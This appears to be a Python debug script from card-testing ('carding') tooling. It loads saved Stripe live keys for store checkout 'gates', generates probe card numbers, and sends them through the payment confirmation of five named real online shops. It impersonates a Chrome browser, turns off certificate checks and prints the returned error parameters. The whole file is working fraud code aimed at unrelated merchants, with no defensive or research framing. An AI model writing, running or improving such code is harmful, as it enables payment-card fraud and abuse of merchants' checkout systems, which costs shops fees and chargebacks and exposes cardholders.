# language: python, file: scratch/_debug_batch.py — params ошибок группы гейтов
import asyncio
import json
import sys

from curl_cffi.requests import AsyncSession

import gate_client as gc

sys.stdout.reconfigure(line_buffering=True, encoding="utf-8")

TARGETS = [
    "https://herbaura.fr",
    "https://wellyou.lt",
    "https://coachconnectaustralia.com.au",
    "https://cuttingfluid.online",
    "https://tricolistica.com",
]


async def one(root: str, gates: list[dict]):
    pk = ""
    for g in gates:
        if g["base_url"] == root:
            pk = g.get("pk_live", "")
    probe = gc.gen_probe_card()
    card_raw = f"{probe['number']}|{probe['mm']}|{probe['yy']}|{probe['cvc']}"
    try:
        async with AsyncSession(impersonate="chrome131", verify=False) as s:
            res = await gc.store_api_confirm(s, root, pk, card_raw, country="US",
                                             max_price_cents=3000)
    except Exception as e:
        res = {"status": "EXC", "detail": f"{type(e).__name__}: {e}"[:100]}
    print(f"\n== {root}")
    print("  status:", res.get("status"))
    print("  detail:", str(res.get("detail"))[:200])
    if res.get("params"):
        print("  params:", json.dumps(res["params"], ensure_ascii=False)[:400])


async def main():
    gates = json.load(open("data/store_gates.json", encoding="utf-8"))
    for t in TARGETS:
        await one(t, gates)


if __name__ == "__main__":
    asyncio.run(main())
